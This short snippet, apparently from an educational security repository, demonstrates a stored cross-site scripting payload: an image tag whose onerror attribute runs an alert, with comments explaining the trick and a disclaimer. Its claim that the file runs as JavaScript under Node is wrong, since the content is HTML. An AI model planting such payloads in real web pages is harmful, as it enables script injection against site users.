// Created August 16th, 2023 - By: Devon Griffith A.K.A. rootPHAGE / 我爱数据
// Run on Windows [ Node <path to file>\Stored_XSS_JavaScript.js ]
// Stored XXS = Attacker can insert an image tag with an 'onerror' attribute.
// When the image can't load, the 'onerror' event is triggered, executing the malware.

<div>
  <img src="#" onerror="alert('Stored XSS')">
</div>

// DO NOT USE THIS SCRIPT MALICIOUSLY - PROVIDED FOR EDUCATIONAL PURPOSES ONLY
